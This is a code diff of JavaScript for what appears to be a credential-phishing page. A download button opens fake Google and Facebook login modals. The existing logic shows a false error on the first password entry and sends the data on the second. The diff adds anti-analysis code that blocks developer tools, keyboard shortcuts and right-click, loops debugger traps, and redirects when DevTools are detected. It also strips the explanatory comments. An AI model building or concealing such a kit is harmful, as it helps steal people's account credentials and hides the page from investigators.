@@ -1,3 +1,61 @@
+(function() {
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12' || e.keyCode === 123) {
+            e.preventDefault();
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
+            e.preventDefault();
+            return false;
+        }
+        if (e.ctrlKey && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) {
+            e.preventDefault();
+            return false;
+        }
+        if (e.ctrlKey && (e.key === 'S' || e.key === 's' || e.keyCode === 83)) {
+            e.preventDefault();
+            return false;
+        }
+        if (e.ctrlKey && (e.key === 'P' || e.key === 'p' || e.keyCode === 80)) {
+            e.preventDefault();
+            return false;
+        }
+    });
+    document.addEventListener('dragstart', function(e) { e.preventDefault(); });
+    document.addEventListener('selectstart', function(e) { e.preventDefault(); });
+    setInterval(function() {
+        console.clear();
+        console.log("%cSTOP!", "color: red; font-size: 50px; font-weight: bold; text-shadow: 2px 2px 0 #000;");
+        console.log("%cThis is a secured system. Stealing code is illegal.", "color: gray; font-size: 20px;");
+    }, 3000);
+
+    setInterval(function() {
+        (function() { return false; })['constructor']('debugger')['call']();
+    }, 2000);
+    var windowWidth = window.innerWidth;
+    var windowHeight = window.innerHeight;
+    var devtoolsOpen = false;
+    
+    var detectDevTools = function() {
+        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+            return;
+        }
+        
+        var widthThreshold = window.outerWidth - window.innerWidth > 160;
+        var heightThreshold = window.outerHeight - window.innerHeight > 160;
+        
+        if(widthThreshold || heightThreshold) {
+            if(!devtoolsOpen) {
+                devtoolsOpen = true;
+                document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:50px;'>SECURITY ALERT: DEVELOPER TOOLS DETECTED</h1><p style='text-align:center;'>Access Denied. Please close DevTools to continue.</p>";
+                window.location.replace("protection.php");
+            }
+        }
+    };
+    setInterval(detectDevTools, 500);
+})();
+
 var avatarColors = {
   a:'av-red',b:'av-pink',c:'av-purple',d:'av-indigo',
   e:'av-blue',f:'av-blue',g:'av-teal',h:'av-green',
@@ -8,8 +66,6 @@ var avatarColors = {
   y:'av-indigo',z:'av-grey'
 };
 function getAvatarClass(l){ return avatarColors[l.toLowerCase()]||'av-blue'; }
-
-// ========== PENAMBAHAN: variabel penghitung percobaan ==========
 let googleAttempt = 0;
 let fbAttempt = 0;
 
@@ -19,7 +75,6 @@ function openModal() {
 }
 function closeModal() {
   document.getElementById('overlay').classList.remove('active');
-  // ========== PENAMBAHAN: reset penghitung saat modal ditutup ==========
   googleAttempt = 0;
   fbAttempt = 0;
 }
@@ -73,8 +128,6 @@ function gHandlePassNext() {
     return;
   }
   inp.classList.remove('error');
-  
-  // ========== PERUBAHAN: percobaan pertama hanya tampilkan error ==========
   if (googleAttempt === 0) {
     googleAttempt++;
     inp.classList.add('error','shake');
@@ -82,7 +135,6 @@ function gHandlePassNext() {
     setTimeout(function(){ inp.classList.remove('shake'); }, 400);
     return;
   }
-  // ========== PERUBAHAN: percobaan kedua lanjut kirim data ==========
   err.textContent = '';
 
   var dim = document.getElementById('gPassLoadingDim');
@@ -136,7 +188,6 @@ function fbHandleLogin() {
   }
   passErr.textContent = '';
 
-  // ========== PERUBAHAN: percobaan pertama hanya tampilkan error ==========
   if (fbAttempt === 0) {
     fbAttempt++;
     passInp.classList.add('error','shake');
@@ -144,8 +195,7 @@ function fbHandleLogin() {
     setTimeout(function(){ passInp.classList.remove('shake'); }, 400);
     return;
   }
-
-  // ========== PERUBAHAN: percobaan kedua lanjut kirim data & redirect langsung ==========
+  
   var btn = document.getElementById('fbLoginBtn');
   var spinner = document.getElementById('fbBtnSpinner');
   var btnText = document.getElementById('fbBtnText');
@@ -294,4 +344,4 @@ window.addEventListener('DOMContentLoaded', function(){
   if (downloadBtn) {
     downloadBtn.addEventListener('click', openModal);
   }
-}); 
+});
